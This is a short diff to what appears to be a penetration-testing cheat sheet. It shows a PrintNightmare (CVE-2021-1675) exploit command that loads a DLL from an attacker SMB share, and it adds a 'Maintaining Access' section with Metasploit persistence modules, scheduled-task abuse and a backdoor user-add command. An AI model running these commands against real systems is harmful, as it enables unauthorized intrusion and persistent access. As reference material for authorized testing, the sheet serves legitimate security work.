@@ -181,3 +181,13 @@ smbserver.py share `pwd` -smb2support
 ```bash
 python3 CVE-2021-1675.py <DC>/<user>:<Password>@<DC IP> '\\<LHOST>\share\shell.dll'
 ```
+# Maintaining Access
+- #### Persistence Scripts
+   - run persistence -h
+   - exploit/windows/local/persistence
+   - exploit/windows/local/registery_persistence
+- #### Scheduled Tasks
+   - run scheduleme
+   - run schtaskabuse
+- #### Add a User
+   - Net user badboy password123 /add
